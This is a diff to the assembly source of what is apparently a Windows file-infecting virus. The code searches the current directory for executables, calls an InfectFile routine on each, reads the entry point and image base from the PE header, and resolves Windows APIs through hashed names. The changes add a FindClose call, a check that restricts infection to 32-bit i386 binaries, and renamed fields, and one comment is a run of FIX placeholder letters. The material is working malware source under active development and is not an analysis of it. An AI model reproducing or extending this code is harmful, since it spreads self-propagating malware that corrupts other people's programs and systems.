@@ -21,6 +21,7 @@ struc DATA
     .CloseHandle:             resd 1
     .CreateFileA:             resd 1
     .CreateFileMappingA:      resd 1
+    .FindClose:               resd 1
     .FindFirstFileA:          resd 1
     .FindNextFileA:           resd 1
     .GetFileAttributesA:      resd 1
@@ -175,7 +176,7 @@ discard:
 
     ; Now we begin with the business of infecting some files
 
-    ; SetCurrentDirectory
+    ; SetCurrentDirectory ;FIXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXxxXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
     mov     ebx, [ebp + DATA.EIP]
     add     ebx, directory - anchor
     push    ebx
@@ -183,7 +184,7 @@ discard:
 
 
     ; find first file
-    lea     ebx, [ebp + DATA.search]
+    lea     ebx, [ebp + DATA.FIND_DATA]
     push    ebx                             ; Push the address of the search record
     mov     ebx, [ebp + DATA.EIP]           ; Compute pointer to file mask
     add     ebx, exestr - anchor
@@ -192,8 +193,8 @@ discard:
     cmp     eax, -1
     jz      doneInfecting
     mov     edi, eax                        ; edi will store the file handle
-    mov     esi, [ebp + DATA.search + 44]   ; read pointer to file name
-    mov     ecx, [ebp + DATA.search + 32]   ; read file size (lower 4 bytes)
+    mov     esi, [ebp + DATA.FIND_DATA + 44]; read pointer to file name
+    mov     ecx, [ebp + DATA.FIND_DATA + 32]; read file size (lower 4 bytes)
     call    InfectFile
 again:
     lea     ebx, [ebp + DATA.search]
@@ -203,15 +204,17 @@ again:
     call    [ebp + DATA.FindNextFileA]
     cmp     eax, 0
     jz      doneInfecting
-    PRINT_FILE [ebp + DATA.search + 44]
-    mov     esi, [ebp + DATA.search + 44]
-    mov     ecx, [ebp + DATA.search + 32]
+    PRINT_FILE [ebp + DATA.FIND_DATA + 44]
+    mov     esi, [ebp + DATA.FIND_DATA + 44]
+    mov     ecx, [ebp + DATA.FIND_DATA + 32]
     call    InfectFile
     PRINT_TRACE
     jmp     again
 
 
 doneInfecting:
+    push     edi
+    call    [ebp + DATA.FindClose]
 
     ; hStdOut = GetstdHandle(STD_OUTPUT_HANDLE)
     push    -11
@@ -360,7 +363,10 @@ OkGo:
 
     add     esi, ebx                                ; (ESI points to PE header)
     mov     [ebp + DATA.PEHeader], esi              ; Save PE header
-    mov     eax, [esi + 28h]
+    mov     eax, [esi + 4h]                         ; read machine field in PE Header
+    cmp     ax, 0x014c                              ; 0x014c = Intel 386
+    jnz     UnmapView                               ; if not 32 bit, then error and quit
+    mov     eax, [esi + 28h]     
     mov     [ebp + DATA.oldEntryPoint], eax         ; Save Entry Point of file
     mov     eax, [esi + 34h]                        ; Find the Image Base
     mov     [ebp + DATA.imageBase], eax             ; Save the Image Base
@@ -617,7 +623,7 @@ CloseFile:
 
     mov     ebx, [ebp + DATA.fileAttributes]
     push    ebx
-    lea     ebx, [ebp + DATA.search + 44]
+    lea     ebx, [ebp + DATA.FIND_DATA + 44]
     push    ebx                ; Push the address of the search record
     PRINT_TRACE
     call    [ebp + DATA.SetFileAttributesA]
@@ -664,6 +670,7 @@ getEIP:
      CloseHandle:             dd 0x59e68620
      CreateFileA:             dd 0x44990e89
      CreateFileMappingA:      dd 0xa481360b
+     FindClose:               dd 0x8f86c39f
      FindFirstFileA:          dd 0x79e4b02e
      FindNextFileA:           dd 0x853fd939
      GetFileAttributesA:      dd 0xbcd7bc98
